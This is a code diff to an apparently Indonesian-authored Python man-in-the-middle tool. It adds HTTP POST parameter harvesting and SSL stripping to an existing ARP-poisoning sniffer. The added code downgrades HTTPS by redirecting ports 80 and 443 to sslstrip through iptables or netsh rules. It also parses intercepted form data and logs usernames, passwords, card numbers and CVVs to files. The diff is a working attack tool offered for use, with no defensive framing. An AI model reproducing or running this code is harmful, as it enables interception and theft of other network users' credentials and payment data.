@@ -3,21 +3,38 @@ import sys
 import threading
 import netifaces
 import time
-import platform  # Untuk mendeteksi OS
+import platform
 from colorama import init, Fore, Style
 import re
 import subprocess
 
 # Auto-install modules if not present
-def install_and_import(package):
+def install_and_import(package, import_as=None):
     try:
-        __import__(package)
+        if import_as:
+            globals()[import_as] = __import__(package)
+        else:
+            __import__(package)
     except ImportError:
-        os.system(f"{sys.executable} -m pip install {package}")
-        __import__(package)
+        print(Fore.YELLOW + f"[!] Installing missing package: {package}")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+        if import_as:
+            globals()[import_as] = __import__(package)
+        else:
+            __import__(package)
 
-for module in ['scapy.all', 'netifaces', 'colorama']:
-    install_and_import(module)
+# Install required modules
+required_modules = {
+    'scapy.all': 'scapy',
+    'netifaces': 'netifaces',
+    'colorama': 'colorama',
+    'twisted==21.2.0' : 'twisted==21.2.0',
+    'sslstrip': 'sslstrip'
+    
+}
+
+for module, package in required_modules.items():
+    install_and_import(package)
 
 from scapy.all import *
 
@@ -46,18 +63,15 @@ def list_scapy_interfaces():
         print(Fore.YELLOW + f"{idx + 1}. {interface} - {ip_address}")
     return interface_info
 
-# Ping IP to verify connection (cross-platform)
+# Ping IP to verify connection
 def ping_ip(ip):
     system_platform = platform.system()
     try:
         if system_platform == "Windows":
-            # Perintah untuk Windows
             output = subprocess.check_output(["ping", "-n", "1", "-w", "1000", ip], stderr=subprocess.DEVNULL).decode()
         else:
-            # Perintah untuk Linux/MacOS
             output = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip], stderr=subprocess.DEVNULL).decode()
-        
-        return "TTL=" in output or "ttl=" in output  # TTL case sensitivity
+        return "TTL=" in output or "ttl=" in output
     except subprocess.CalledProcessError:
         return False
 
@@ -81,14 +95,8 @@ def network_scanner(ip_range, local_subnet):
 
     if not active_devices:
         print(Fore.YELLOW + "[!] No active devices detected via ARP. Checking ARP table...")
-
-        # Deteksi OS dan sesuaikan perintah ARP
         system_platform = platform.system()
-        if system_platform == "Windows":
-            arp_command = "arp -a"
-        else:
-            arp_command = "ip neigh"
-
+        arp_command = "arp -a" if system_platform == "Windows" else "ip neigh"
         arp_table = subprocess.check_output(arp_command, shell=True).decode()
 
         for line in arp_table.splitlines():
@@ -134,6 +142,13 @@ def process_packet(packet):
     if packet.haslayer(Raw):
         try:
             payload = packet[Raw].load.decode('utf-8', errors='ignore')
+            
+            # Deteksi POST dan parsing parameter
+            if payload.startswith("POST"):
+                print(Fore.CYAN + f"\n[!] HTTP POST Data Detected from {packet[IP].src}")
+                parse_post_parameters(payload)
+            
+            # Deteksi data sensitif
             if re.search(r'(?i)(username|user|userid|password|pass|pwd|login|email|creditcard|card number|cvv|payment)', payload):
                 log_sensitive_data(packet, payload)
         except UnicodeDecodeError:
@@ -145,14 +160,24 @@ def process_packet(packet):
         except UnicodeEncodeError:
             print(Fore.RED + "\r[!] Paket mengandung karakter yang tidak bisa ditampilkan.", end='')
 
-# Log packets
-def log_packet(packet):
-    src_ip = packet[IP].src
-    log_dir = "logs"
-    if not os.path.exists(log_dir):
-        os.makedirs(log_dir)
-    with open(os.path.join(log_dir, f"{src_ip}.log"), 'a', encoding='utf-8', errors='ignore') as f:
-        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {packet.summary()}\n")
+# Parse POST parameters
+def parse_post_parameters(payload):
+    try:
+        headers, body = payload.split("\r\n\r\n", 1)
+        post_params = dict(param.split('=') for param in body.split('&') if '=' in param)
+        
+        if post_params:
+            print(Fore.YELLOW + "\n[!] POST Parameters Detected:")
+            for key, value in post_params.items():
+                print(f"{Fore.GREEN}    {key}: {Fore.CYAN}{value}")
+
+            with open("logs/parsed_post_parameters.log", 'a', encoding='utf-8') as f:
+                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Detected POST Parameters:\n")
+                for key, value in post_params.items():
+                    f.write(f"{key}: {value}\n")
+                f.write("="*50 + "\n")
+    except Exception as e:
+        print(Fore.RED + f"[!] Error parsing POST parameters: {e}")
 
 # Log sensitive data
 def log_sensitive_data(packet, payload):
@@ -178,6 +203,59 @@ def monitor_network_changes(interface, known_devices):
                     f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - New device detected: MAC: {new_mac}\n")
             known_devices.update(new_macs)
         time.sleep(10)
+
+# SSL Stripping setup
+def start_sslstrip():
+    system_platform = platform.system()
+    print(Fore.CYAN + "[+] Setting up SSL Stripping...")
+
+    if system_platform == "Linux":
+        try:
+            # Redirect HTTP & HTTPS traffic to port 8080
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"], check=True)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8080"], check=True)
+
+            # Start sslstrip
+            sslstrip_process = subprocess.Popen(["sslstrip", "-l", "8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print(Fore.GREEN + "[+] SSL Stripping started on port 8080.")
+            return sslstrip_process
+        except Exception as e:
+            print(Fore.RED + f"[!] Error starting SSL Strip: {e}")
+            return None
+
+    elif system_platform == "Windows":
+        try:
+            # Redirect using netsh
+            subprocess.run(["netsh", "interface", "portproxy", "add", "v4tov4", "listenport=80", "listenaddress=0.0.0.0", "connectport=8080", "connectaddress=127.0.0.1"], check=True)
+            subprocess.run(["netsh", "interface", "portproxy", "add", "v4tov4", "listenport=443", "listenaddress=0.0.0.0", "connectport=8080", "connectaddress=127.0.0.1"], check=True)
+
+            # Start sslstrip via Python
+            sslstrip_process = subprocess.Popen(["python", "-m", "sslstrip", "-l", "8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print(Fore.GREEN + "[+] SSL Stripping started on port 8080.")
+            return sslstrip_process
+        except Exception as e:
+            print(Fore.RED + f"[!] Error starting SSL Strip on Windows: {e}")
+            return None
+    else:
+        print(Fore.RED + "[!] Unsupported OS for SSL stripping.")
+        return None
+
+# Stop SSL Stripping and restore configurations
+def stop_sslstrip(sslstrip_process):
+    system_platform = platform.system()
+    print(Fore.CYAN + "\n[+] Stopping SSL Stripping and restoring settings...")
+
+    if sslstrip_process:
+        sslstrip_process.terminate()
+
+    if system_platform == "Linux":
+        subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
+        subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8080"])
+    elif system_platform == "Windows":
+        subprocess.run(["netsh", "interface", "portproxy", "delete", "v4tov4", "listenport=80", "listenaddress=0.0.0.0"])
+        subprocess.run(["netsh", "interface", "portproxy", "delete", "v4tov4", "listenport=443", "listenaddress=0.0.0.0"])
+
+    print(Fore.GREEN + "[+] SSL Stripping stopped and settings restored.")
 
 # Main execution
 if __name__ == "__main__":
@@ -210,6 +288,9 @@ if __name__ == "__main__":
     if not gateway_mac:
         print(Fore.RED + "[!] Cannot find gateway MAC."); sys.exit(0)
 
+    # Mulai SSL Stripping
+    sslstrip_process = start_sslstrip()
+
     print(Fore.CYAN + "[+] Starting ARP poisoning...")
     try:
         sniff_thread = threading.Thread(target=packet_sniffer, args=(selected_interface,))
@@ -233,4 +314,7 @@ if __name__ == "__main__":
         for device in devices:
             restore_arp(device['ip'], device['mac'], GATEWAY_IP, gateway_mac, selected_interface)
             restore_arp(GATEWAY_IP, gateway_mac, device['ip'], device['mac'], selected_interface)
+        
+        # Stop SSL Stripping
+        stop_sslstrip(sslstrip_process)
         sys.exit(0)
